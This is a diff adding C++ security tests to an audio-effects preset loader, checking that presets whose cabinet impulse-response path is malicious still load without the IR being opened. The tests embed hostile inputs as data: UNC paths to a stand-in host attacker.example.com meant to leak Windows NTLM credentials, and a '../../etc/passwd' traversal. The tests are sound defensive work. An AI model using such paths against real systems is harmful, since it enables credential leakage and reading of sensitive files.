@@ -6,6 +6,7 @@
 #include "audio/effects/overdrive.h"
 #include "audio/effects/equalizer.h"
 #include "audio/effects/reverb.h"
+#include "audio/effects/cabinet_sim.h"
 
 #include <fstream>
 #include <cstdio>
@@ -295,4 +296,223 @@ TEST(preset_midi_mappings_roundtrip) {
     std::remove(path.c_str());
     engine.shutdown();
     engine2.shutdown();
+}
+
+// ============================================================
+// Security: malicious ir_path values in preset JSON
+// ============================================================
+
+// Helper: write a raw JSON preset string to a temp file and load it.
+// Returns true if load_preset() succeeds (preset loads), regardless of
+// whether the IR itself was accepted. Callers verify IR state separately.
+static bool load_raw_preset(const std::string& json,
+                             const std::string& preset_path,
+                             Amplitron::AudioEngine& engine) {
+    {
+        std::ofstream f(preset_path);
+        if (!f.is_open()) return false;
+        f << json;
+    }
+    bool ok = Amplitron::PresetManager::load_preset(preset_path, engine, nullptr);
+    std::remove(preset_path.c_str());
+    return ok;
+}
+
+TEST(preset_malicious_ir_unc_backslash_rejected) {
+    // A preset with a Windows UNC path must load successfully (the Cabinet
+    // effect is added to the chain) but the IR must NOT be loaded — attempting
+    // to open \\server\share would leak NTLM credentials on Windows.
+    const std::string malicious_json = R"({
+        "format_version": 1,
+        "name": "Evil Preset",
+        "description": "",
+        "input_gain": 1.0,
+        "output_gain": 1.0,
+        "effects": [{
+            "type": "Cabinet",
+            "enabled": true,
+            "mix": 1.0,
+            "params": [],
+            "metadata": { "ir_path": "\\\\attacker.example.com\\share\\evil.wav" }
+        }],
+        "midi_mappings": []
+    })";
+
+    Amplitron::AudioEngine engine;
+    engine.initialize();
+
+    const std::string preset_path = "presets/test_malicious_unc.json";
+    std::filesystem::create_directories("presets");
+    bool loaded = load_raw_preset(malicious_json, preset_path, engine);
+
+    ASSERT_TRUE(loaded);  // Preset itself loads fine
+
+    // The Cabinet effect should exist in the chain but have no IR loaded
+    bool found_cabinet = false;
+    bool ir_loaded = false;
+    for (const auto& fx : engine.effects()) {
+        if (std::strcmp(fx->name(), "Cabinet") == 0) {
+            found_cabinet = true;
+            auto* cab = dynamic_cast<Amplitron::CabinetSim*>(fx.get());
+            if (cab && cab->has_ir()) ir_loaded = true;
+        }
+    }
+    ASSERT_TRUE(found_cabinet);
+    ASSERT_FALSE(ir_loaded);
+
+    engine.shutdown();
+}
+
+TEST(preset_malicious_ir_unc_forward_slash_rejected) {
+    // //server/share UNC form — must also be rejected.
+    const std::string malicious_json = R"({
+        "format_version": 1,
+        "name": "Evil Preset 2",
+        "description": "",
+        "input_gain": 1.0,
+        "output_gain": 1.0,
+        "effects": [{
+            "type": "Cabinet",
+            "enabled": true,
+            "mix": 1.0,
+            "params": [],
+            "metadata": { "ir_path": "//attacker.example.com/share/evil.wav" }
+        }],
+        "midi_mappings": []
+    })";
+
+    Amplitron::AudioEngine engine;
+    engine.initialize();
+
+    const std::string preset_path = "presets/test_malicious_unc2.json";
+    std::filesystem::create_directories("presets");
+    bool loaded = load_raw_preset(malicious_json, preset_path, engine);
+
+    ASSERT_TRUE(loaded);
+
+    bool ir_loaded = false;
+    for (const auto& fx : engine.effects()) {
+        if (std::strcmp(fx->name(), "Cabinet") == 0) {
+            auto* cab = dynamic_cast<Amplitron::CabinetSim*>(fx.get());
+            if (cab && cab->has_ir()) ir_loaded = true;
+        }
+    }
+    ASSERT_FALSE(ir_loaded);
+
+    engine.shutdown();
+}
+
+TEST(preset_malicious_ir_traversal_rejected) {
+    // Path traversal attempting to escape the filesystem root and read a
+    // sensitive file must be rejected; the preset chain must still load.
+    const std::string malicious_json = R"({
+        "format_version": 1,
+        "name": "Traversal Preset",
+        "description": "",
+        "input_gain": 1.0,
+        "output_gain": 1.0,
+        "effects": [{
+            "type": "Cabinet",
+            "enabled": true,
+            "mix": 1.0,
+            "params": [],
+            "metadata": { "ir_path": "../../etc/passwd" }
+        }],
+        "midi_mappings": []
+    })";
+
+    Amplitron::AudioEngine engine;
+    engine.initialize();
+
+    const std::string preset_path = "presets/test_malicious_traversal.json";
+    std::filesystem::create_directories("presets");
+    bool loaded = load_raw_preset(malicious_json, preset_path, engine);
+
+    ASSERT_TRUE(loaded);
+
+    bool ir_loaded = false;
+    for (const auto& fx : engine.effects()) {
+        if (std::strcmp(fx->name(), "Cabinet") == 0) {
+            auto* cab = dynamic_cast<Amplitron::CabinetSim*>(fx.get());
+            if (cab && cab->has_ir()) ir_loaded = true;
+        }
+    }
+    ASSERT_FALSE(ir_loaded);
+
+    engine.shutdown();
+}
+
+TEST(preset_benign_no_ir_path_loads_cleanly) {
+    // A well-formed preset without an ir_path must load completely unaffected
+    // by the new validation code.
+    const std::string benign_json = R"({
+        "format_version": 1,
+        "name": "Benign Preset",
+        "description": "Clean chain",
+        "input_gain": 0.9,
+        "output_gain": 0.8,
+        "effects": [{
+            "type": "Noise Gate",
+            "enabled": true,
+            "mix": 1.0,
+            "params": [],
+            "metadata": {}
+        }],
+        "midi_mappings": []
+    })";
+
+    Amplitron::AudioEngine engine;
+    engine.initialize();
+
+    const std::string preset_path = "presets/test_benign.json";
+    std::filesystem::create_directories("presets");
+    bool loaded = load_raw_preset(benign_json, preset_path, engine);
+
+    ASSERT_TRUE(loaded);
+    ASSERT_FALSE(engine.effects().empty());
+
+    engine.shutdown();
+}
+
+TEST(preset_cabinet_no_ir_path_loads_without_ir) {
+    // Cabinet in a preset with no ir_path metadata must be added to the chain
+    // but have no IR active — the parametric EQ fallback takes over.
+    const std::string json = R"({
+        "format_version": 1,
+        "name": "Cabinet No IR",
+        "description": "",
+        "input_gain": 1.0,
+        "output_gain": 1.0,
+        "effects": [{
+            "type": "Cabinet",
+            "enabled": true,
+            "mix": 1.0,
+            "params": [],
+            "metadata": {}
+        }],
+        "midi_mappings": []
+    })";
+
+    Amplitron::AudioEngine engine;
+    engine.initialize();
+
+    const std::string preset_path = "presets/test_cab_no_ir.json";
+    std::filesystem::create_directories("presets");
+    bool loaded = load_raw_preset(json, preset_path, engine);
+
+    ASSERT_TRUE(loaded);
+
+    bool found_cabinet = false;
+    bool ir_loaded = false;
+    for (const auto& fx : engine.effects()) {
+        if (std::strcmp(fx->name(), "Cabinet") == 0) {
+            found_cabinet = true;
+            auto* cab = dynamic_cast<Amplitron::CabinetSim*>(fx.get());
+            if (cab && cab->has_ir()) ir_loaded = true;
+        }
+    }
+    ASSERT_TRUE(found_cabinet);
+    ASSERT_FALSE(ir_loaded);
+
+    engine.shutdown();
 }
